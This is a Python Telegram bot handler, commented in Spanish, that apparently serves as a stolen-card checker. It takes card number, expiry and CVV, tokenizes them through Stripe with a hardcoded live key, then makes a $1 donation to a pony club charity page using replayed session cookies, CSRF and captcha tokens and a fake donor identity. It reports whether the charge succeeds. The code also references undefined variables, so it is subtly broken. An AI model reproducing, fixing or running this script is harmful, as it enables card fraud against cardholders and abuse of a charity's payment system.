# Format Python code here
import asyncio

import requests
from aiogram import Router, types
from aiogram.filters import Command

router = Router()


@router.message(Command("str"))
async def st_handler(msg: types.Message):
    args = msg.text.split(" ", maxsplit=1)
    if len(args) < 2:
        return await msg.answer(
            "❌ Formato incorrecto.\nEjemplo: /str 4111111111111111|12|2026|123"
        )

    try:
        numero, mes, ano, cvv = args[1].strip().split("|")
    except ValueError:
        return await msg.answer(
            "❌ Debes enviar los 4 datos separados por `|`", parse_mode="Markdown"
        )

    await msg.answer("🔄 Procesando...")

    # Primer request a Stripe API
    try:
        headers1 = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "accept-language": "es-CL,es-419;q=0.9,es;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        }

        # Corrige las variables en el string de data. No uses $ sino f-string con {}
        data = (
            f"referrer=https%3A%2F%2Fdonate.ponyclub.org"
            f"&type=card"
            f"&card[number]={numero}"
            f"&card[cvc]={cvv}"
            f"&card[exp_month]={mes}"
            f"&card[exp_year]={ano}"
            "&guid=0a144a1a-732d-4329-977e-58574ce0644ab29d8e"
            "&muid=80410e83-7728-42b4-91cc-6bc6ae3316c9cb51a4"
            "&sid=5d0cba90-1933-4d94-aaf9-9042834ac9ed8d7356"
            "&payment_user_agent=stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+card-element"
            "&time_on_page=325591"
            "&key=pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz"
        )

        response1 = requests.post(
            "https://api.stripe.com/v1/sources", headers=headers1, data=data
        )
        response1.raise_for_status()
        json1 = response1.json()
        print("Respuesta Stripe:", json1)

        # Extraemos id y client_secret para el segundo request
        id = json1.get("id")
        client = json1.get("client_secret")

        if not source_id or not client_secret:
            return await msg.answer(
                "❌ Error: No se pudo obtener id o client_secret de Stripe."
            )

    except requests.RequestException as e:
        return await msg.answer(f"❌ Error en la petición a Stripe: {e}")

    # Segundo request a donate.ponyclub.org
    try:
        cookies = {
            "connect.sid": "s%3AxxijT-VNzkiSatPB2gw-F_ArGRZZQ2Oo.5BfDySLpC4AqBmN5oI5xCJH%2F6LrfHzRNAeVbaJkTA20",
            "optimizelyEndUserId": "oeu1749415320769r0.7477859404870995",
            "_hp2_ses_props.1566116007": "%7B%22r%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22ts%22%3A1749415336071%2C%22d%22%3A%22donate.ponyclub.org%22%2C%22h%22%3A%22%2Fgive%2F647035%2F%22%2C%22g%22%3A%22%23!%2Fdonation%2Fcheckout%22%7D",
            "__stripe_mid": "80410e83-7728-42b4-91cc-6bc6ae3316c9cb51a4",
            "__stripe_sid": "5d0cba90-1933-4d94-aaf9-9042834ac9ed8d7356",
            "classy-session-id": "27293cee-4197-48d2-9582-396dc7c99640",
            "__cf_bm": "RBev6CHy9.20V4oNm5wCwJbpLbh5sz50oIgWc5F5A.M-1749418250-1.0.1.1-jNSFRHRHE.9q.kyZiAm7M9_jNnrZVzt5Yw0kggt8J3HJb0TZENMk32qsVGypCDp6QOCtQToujFIXPGJfklWzmp7UT_7GDLY9uEYgo3B8_No",
            "__cfruid": "6253ff1e65e2b31867963c19b6a11a0fe55d1faa-1749418250",
            "_cfuvid": "4vRd2nPe8KaCdjrX3eLn_Cy8Z60FAqFclQXHDPaoJ.Q-1749418250437-0.0.1.1-604800000",
            "_hp2_props.1566116007": "%7B%22classy-session-id%22%3A%2227293cee-4197-48d2-9582-396dc7c99640%22%2C%22environment%22%3A%22prod%22%2C%22organization_id%22%3A69654%2C%22payment_processor%22%3Anull%2C%22campaign%22%3A647035%2C%22campaign_type%22%3A%22crowdfunding%22%2C%22duplicate_fundraisers%22%3Afalse%2C%22existing_fundraiser%22%3Afalse%7D",
            "_hp2_id.1566116007": "%7B%22userId%22%3A%227467084013513040%22%2C%22pageviewId%22%3A%225563020518497919%22%2C%22sessionId%22%3A%228378233158103980%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D",
            "XSRF-TOKEN": "eyJpdiI6IjgrejY4WlRDV1F5MDFCY1ZqSENKWEE9PSIsInZhbHVlIjoiL3VscGlOODM5VzRiMkZaNmE2YTZlVnF6a01nNldGYU5BeWQ1UzNXTTRuVW1xMEQxcjFpTklyWjZuRWc2YjJwRWNDM0ptK0JUMDVoeWw2NTkwd1QyaURNeVR3bGwvWnl5M0pwSUw2SFJIK2tJVTR2UHBHalJLOTJwb1QwWHc5cTciLCJtYWMiOiJmMDc0NDQwNTQ3NDAyMzkwYTRmM2Y3MWE3OGQyNjk2MTYwZGY4ZWEwYmJlNGIwOWNlNzU2MjhlY2UwYWJiYjYyIiwidGFnIjoiIn0%3D",
            "sid": "eyJpdiI6ImFNcUh6MTlMWkZ5NHFQSGUvYm5TRVE9PSIsInZhbHVlIjoid0Y2Vk9LMHZDc3JmWEljNHcyQm9ybmY3Yk9DbzVMeXQxRGN5SWx4MUxiS1ovUUsxUmdLSFkwcWt4ZnRYcXN6SWlicjJPTDBDc0FpTHk2ekZWdk9RNitDbU5MRzVwSEtwMVNuazFJQWFyVGpDN0VUL1dQMW1FcHRmSDBIcERFU1MiLCJtYWMiOiI2ZGU5YTg5ODQzMDcyZDc5ZjdjZGZmOGUyOWIwNTkyZTEzZTYyZmU0OWQ0OWFlYzYxNTE0OTA4ZGYzYzhkM2QwIiwidGFnIjoiIn0%3D",
            "optimizelySession": "1749418520692",
            "CSRF-TOKEN": "EsAkL8CK-L5izXlX9BtopP1A-cH5uN4fXEzs",
            "pjs_user_entered_custom_amount": "yes",
            "pjs_manual_ach_donation": "no",
            # de aquí más cookies si son necesarias para que funcione la petición
        }

        headers2 = {
            "authority": "donate.ponyclub.org",
            "accept": "application/json, text/plain, */*",
            "accept-language": "es-CL,es-419;q=0.9,es;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            # 'cookie': 'connect.sid=s%3AxxijT-VNzkiSatPB2gw-F_ArGRZZQ2Oo.5BfDySLpC4AqBmN5oI5xCJH%2F6LrfHzRNAeVbaJkTA20; optimizelyEndUserId=oeu1749415320769r0.7477859404870995; _hp2_ses_props.1566116007=%7B%22r%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22ts%22%3A1749415336071%2C%22d%22%3A%22donate.ponyclub.org%22%2C%22h%22%3A%22%2Fgive%2F647035%2F%22%2C%22g%22%3A%22%23!%2Fdonation%2Fcheckout%22%7D; __stripe_mid=80410e83-7728-42b4-91cc-6bc6ae3316c9cb51a4; __stripe_sid=5d0cba90-1933-4d94-aaf9-9042834ac9ed8d7356; classy-session-id=27293cee-4197-48d2-9582-396dc7c99640; __cf_bm=RBev6CHy9.20V4oNm5wCwJbpLbh5sz50oIgWc5F5A.M-1749418250-1.0.1.1-jNSFRHRHE.9q.kyZiAm7M9_jNnrZVzt5Yw0kggt8J3HJb0TZENMk32qsVGypCDp6QOCtQToujFIXPGJfklWzmp7UT_7GDLY9uEYgo3B8_No; __cfruid=6253ff1e65e2b31867963c19b6a11a0fe55d1faa-1749418250; _cfuvid=4vRd2nPe8KaCdjrX3eLn_Cy8Z60FAqFclQXHDPaoJ.Q-1749418250437-0.0.1.1-604800000; _hp2_props.1566116007=%7B%22classy-session-id%22%3A%2227293cee-4197-48d2-9582-396dc7c99640%22%2C%22environment%22%3A%22prod%22%2C%22organization_id%22%3A69654%2C%22payment_processor%22%3Anull%2C%22campaign%22%3A647035%2C%22campaign_type%22%3A%22crowdfunding%22%2C%22duplicate_fundraisers%22%3Afalse%2C%22existing_fundraiser%22%3Afalse%7D; _hp2_id.1566116007=%7B%22userId%22%3A%227467084013513040%22%2C%22pageviewId%22%3A%225563020518497919%22%2C%22sessionId%22%3A%228378233158103980%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; XSRF-TOKEN=eyJpdiI6IjgrejY4WlRDV1F5MDFCY1ZqSENKWEE9PSIsInZhbHVlIjoiL3VscGlOODM5VzRiMkZaNmE2YTZlVnF6a01nNldGYU5BeWQ1UzNXTTRuVW1xMEQxcjFpTklyWjZuRWc2YjJwRWNDM0ptK0JUMDVoeWw2NTkwd1QyaURNeVR3bGwvWnl5M0pwSUw2SFJIK2tJVTR2UHBHalJLOTJwb1QwWHc5cTciLCJtYWMiOiJmMDc0NDQwNTQ3NDAyMzkwYTRmM2Y3MWE3OGQyNjk2MTYwZGY4ZWEwYmJlNGIwOWNlNzU2MjhlY2UwYWJiYjYyIiwidGFnIjoiIn0%3D; sid=eyJpdiI6ImFNcUh6MTlMWkZ5NHFQSGUvYm5TRVE9PSIsInZhbHVlIjoid0Y2Vk9LMHZDc3JmWEljNHcyQm9ybmY3Yk9DbzVMeXQxRGN5SWx4MUxiS1ovUUsxUmdLSFkwcWt4ZnRYcXN6SWlicjJPTDBDc0FpTHk2ekZWdk9RNitDbU5MRzVwSEtwMVNuazFJQWFyVGpDN0VUL1dQMW1FcHRmSDBIcERFU1MiLCJtYWMiOiI2ZGU5YTg5ODQzMDcyZDc5ZjdjZGZmOGUyOWIwNTkyZTEzZTYyZmU0OWQ0OWFlYzYxNTE0OTA4ZGYzYzhkM2QwIiwidGFnIjoiIn0%3D; optimizelySession=1749418520692; CSRF-TOKEN=EsAkL8CK-L5izXlX9BtopP1A-cH5uN4fXEzs; pjs_user_entered_custom_amount=yes; pjs_manual_ach_donation=no',
            "csrf-token": "akKHehum-ZBC5ofqOS1hh9Y_dRuZHRgfvXPI",
            "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQyMzc4NyIsImFwIjoiMzYzNzUxMTgzIiwiaWQiOiI1OGM3YmFiZGRlY2JjYTY3IiwidHIiOiJmZTFjYmQwN2NhYzRlODY4YzdkMDIzYjc3ZDhjNjI4MSIsInRpIjoxNzQ5NDE4NTgxNDY5LCJ0ayI6Ijc0MTExMSJ9fQ==",
            "origin": "https://donate.ponyclub.org",
            "referer": "https://donate.ponyclub.org/give/647035/",
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "traceparent": "00-fe1cbd07cac4e868c7d023b77d8c6281-58c7babddecbca67-01",
            "tracestate": "741111@nr=0-1-423787-363751183-58c7babddecbca67----1749418581469",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "x-newrelic-id": "UAQEVl5UGwAGV1ZQBgMEVg==",
            "x-xsrf-token": "EsAkL8CK-L5izXlX9BtopP1A-cH5uN4fXEzs",
        }

        # Prepara el JSON para la segunda petición usando source_id y client_secret
        json_data2 = {
            "payment": {
                "raw_currency_code": "USD",
                "paypal": {
                    "status": "inactive",
                },
                "paypal_commerce": {
                    "status": "inactive",
                },
                "venmo": {
                    "status": "inactive",
                },
                "ach": {
                    "status": "inactive",
                },
                "stripe": {
                    "status": "ready",
                    "source": {
                        "id": id,
                        "object": "source",
                        "allow_redisplay": "unspecified",
                        "amount": None,
                        "card": {
                            "address_line1_check": None,
                            "address_zip_check": None,
                            "brand": "Visa",
                            "country": "MX",
                            "cvc_check": "unchecked",
                            "dynamic_last4": None,
                            "exp_month": 1,
                            "exp_year": 2032,
                            "funding": "credit",
                            "last4": "2473",
                            "name": None,
                            "three_d_secure": "optional",
                            "tokenization_method": None,
                        },
                        "client_secret": client,
                        "created": 1749418578,
                        "currency": None,
                        "flow": "none",
                        "livemode": True,
                        "owner": {
                            "address": None,
                            "email": None,
                            "name": None,
                            "phone": None,
                            "verified_address": None,
                            "verified_email": None,
                            "verified_name": None,
                            "verified_phone": None,
                        },
                        "statement_descriptor": None,
                        "status": "chargeable",
                        "type": "card",
                        "usage": "reusable",
                    },
                },
                "cc": {
                    "status": "inactive",
                },
                "creditee_team_id": None,
                "method": "Stripe",
                "gateway": {
                    "id": "22877",
                    "name": "STRIPE",
                    "status": "ACTIVE",
                    "currency": "USD",
                },
            },
            "frequency": "one-time",
            "items": [
                {
                    "type": "donation",
                    "product_name": "Donation",
                    "raw_final_price": 1,
                    "previous_frequency_price": 0,
                },
            ],
            "fundraising_page_id": None,
            "fundraising_team_id": None,
            "designation_id": 145059,
            "answers": [
                {
                    "question_id": 1641032,
                    "answer": "Mr.",
                },
                {
                    "question_id": 1641030,
                    "answer": "1999-09-08T05:00:00.000Z",
                },
                {
                    "question_id": 1641027,
                    "question_type": "yes_no",
                    "answer": "No",
                },
            ],
            "billing_address1": "C. Strey 572",
            "billing_address2": "",
            "billing_city": "New york",
            "billing_state": "NY",
            "billing_postal_code": "10010",
            "billing_country": "US",
            "comment": "",
            "member_name": "Firs Lays",
            "member_email_address": "asdimandam@gmail.com",
            "member_phone": "19008007828",
            "is_anonymous": True,
            "opt_in": True,
            "opt_in_wording": "It's okay to contact me in the future.",
            "application_id": "14416",
            "billing_first_name": "Firs",
            "billing_last_name": "Lays",
            "fee_on_top": True,
            "fixed_fot_percent": None,
            "fixed_fot_enabled": False,
            "fee_on_top_amount": 0.37,
            "gross_adjustment": {
                "applied_application_fee_percent": "3.30",
                "applied_processor_fee_percent": "2.40",
                "applied_raw_processor_fee_flat": "0.30",
                "applied_flex_rate_percent": "0.00",
                "raw_processor_fee_amount": "0.33",
                "raw_application_fee_amount": "0.04",
                "raw_flex_rate_amount": "0.00",
            },
            "dedication": None,
            "company_name": None,
            "member_first_name": "Firs",
            "member_last_name": "Lays",
            "token": "03AFcWeA6NRyZ8_OjA7OeftTou6XgE7HuVe4jmPBi_ZMXOAMBnKAn6VC4rArt-4ao8o7R5U2bNXkoerDj0D1PLPbRCAFPE-_BRvFKmO7n9IcH89hRorspPu7nb64UwHzPLAmGjbIN0zGsT5pKEqUDz_hdwCIPZwAPT9ynVOaduLZMbGTJ4sn7zp-aqYqrkcE-yWKD0q_ACKanGPBP-LVGzK6nbl6BRsYm6NK2ULlLx8FctfNU8r4Bbbulzo6VYaG8lRrcxHuouCSDrCaRGMqRCNBcr-icwBE0TdX-Cgk34qKDlzq9oSFHpBslFrvPizdn2mXVBGazwBybh2O_khdtWq3gGTWYNr5m5AYHFNDFyAkweHV0GZNhmlxF6C3nTq427C_fA_TK3RRIyp6xjrscNN8r7q4rGENu6qIvfPIxvTF0AsrwcssJC44svSqSsigDpcndyWWzSRkopM9iI-L2HVscpbKD3_1cJtVEiUnxddzh7ejp9ZhYvHN4k3Dp_79OVzIW8OEgdJivF11m8bSUkivdqLqCiZQsvNJ461iEWl-Jlyd96FcimbKWGPS7_TMDanNtrjmmUOT_gTTRihpIGQ_eykOCMcD7Z1LZEWJLd233afNCqJu4XIh6fUocbBZDYGo5pjq6HonipfUcwjpY6KtFfDQb5bhlpSmfxCh4HjIJuzYOH8Eh0EZI6iiKE64ECMvIf5CMq1tpOvpVPj6iso4igTV3RB-jzoIFhy1F-h0_0YrJqE3AHNG-bnMcdrttYXRkhHQObqcETDBA7BTs1VK8vERq9bW4ALi9BF-XxBX005KTpadRfQbyocp7OzGHULjWFxhiZJSBlsmYuyz6gZ5VVKRhoeTuDIekndNiYrm99gLj-aZCNnxPCM_BgQsGahJ6kpffZ3hbV2kxWtBlHl3RR2rz56EG0-3CGFrJR1sBs66k2i8mRRPzTKD_8k48HF_6vKH3Kss8oAdplbx28vEfXDqaZHbJx9zLPulr2XLuI8cZfpxTu3_3gbmbzOpsqeyRlQiuXlhNCtIgA5ugnVv7rGpRSWpzIbIurm5-cMJI0JM5R6TAKDkgzW092GqqlP3Zt9eESH3i0R-X1NEyFYWjpKxD8Y4Y4HNgescpVgM0v8-f11navdwakg1yLyB512flOHeQnsgLuSXv8JdZmiFeo-T7meDJXYgzfKfsO7vEewUqaamsqCLy-CUfE6KZXxLLwUHOX0-sQOIt8-eGFwc7-lCnxYjLc6rw-HBISYb5krc_U9eCpONuLdh-RC3N8-mOBOdTHFSfUv9mbMVy7d5vyzwWvtrWlSCjQO_qJCg3uUj4gTkW031OP_FYsuzrNYOOLYDg_sekIxkXDIoMxNRPORafmfJCZS9rl8_54LqvmhHTpb1HZjs4erUU_gljgcjjKgYbUppA7NEFNwzzk9kfZru7XFv2Nse6-3lYZhHbk7AFuMBBxtwBtKPBerLemq1pVbw2_VIpOuxdnw2eAkzqO2SsR0bKECIQgLselXxxOsHlx4_j67iVu30Psq80eDTsZKvk25tUpOZIjeeub00kyFFrTV1NtGf12q2g_PU1Ol680FrMqWOru01lCU9iG_4sTYilnxsYaNSPdFsL0w07PrC-8MbJcYR12WN2n94Ng5lXgt00Euo-pyMmg3QlJxdmF1-_NFNnamPLHHQnzwfRlX4gLKnCqq2_7S1KtBywTUThZwwEsoqIPPCCiRFXG-50IENZXPX9koA1PHe6x62V9ccF3F9QmvUWaJZ66ZkFwAM4FkLqMr48oGuv-PPhvpiQkJWgkxcBI_a6bJ_9L6y13d92nOpAQOe89ACwBlFkF-MP7dRvFEhHvjdGFMHIg1oN30SXi_JEgzhgGlpnprTUeDLVQ51ygDcG9kIuJMLLaUwUeatvWRQOrFzDv1n0q9IDJpSyinQRhmYiYuCmxGIXE5U3wrsp_IZM0BLw7M0uL1W1-JZ2SQANme1xc9-hSOpX67bf-DKCsd55FEJDhrjgKGJAZLmZWiJGtXkm4RaKuV0Vt164uQG9QLS2hIawR26Hx11YToxMlAIuTEyaB0eBHwwG4YFm2rdLNYJ6aO5_z46RRPgmMB4l1TgC22eh6jXdcLemnd5as2_rNgclw1OI3t-kyevnb0uWCfhkS2j48ZtFDR_c02aPkhI4ovDG7zk4No8twfdEOVgLG4JLFk8paiGvdRKPXZ5dd2KHu8smeKtDaqjYDjYF5LdkSIHAamNVV3iwjLOREmF9fOtvbRY129LToa06-wsZsWUG9PKCNWisykmqmNWs6jQEyBQge-Fptu3Pq2djY98RqZkvcTHPkciRMsGxWJg",
        }

        response2 = requests.post(
            "https://donate.ponyclub.org/api/donation",
            cookies=cookies,
            headers=headers2,
            json=json_data2,
        )
        response2.raise_for_status()
        json2 = response2.json()
        print("Respuesta Donate:", json2)

        # Muestra en Telegram el resultado de la segunda petición
        await msg.answer(f"✅ Resultado:\n{json2}")

    except requests.RequestException as e:
        return await msg.answer(f"❌ Error en la segunda petición: {e}")
        
